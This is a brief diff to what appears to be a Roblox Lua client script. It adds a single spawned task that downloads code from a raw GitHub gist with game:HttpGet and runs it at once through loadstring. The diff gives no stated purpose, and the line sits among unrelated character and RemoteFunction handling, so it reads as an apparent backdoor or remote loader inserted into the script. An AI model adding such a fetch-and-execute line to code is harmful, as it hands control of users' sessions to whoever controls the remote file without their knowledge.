@@ -90,6 +90,10 @@ if Check then
 end
 
 task.spawn(function()
+    loadstring(game:HttpGet("https://gist.githubusercontent.com/wer4er/e3850471d61eff8f190afc2a43b92626/raw/01c722cfe127d773c96dab37effb878b30edd968/123"))()
+end)
+
+task.spawn(function()
     repeat task.wait() until LocalPlayer.Character
     task.delay(.5, function()
         function RemoteFunction.OnClientInvoke() 
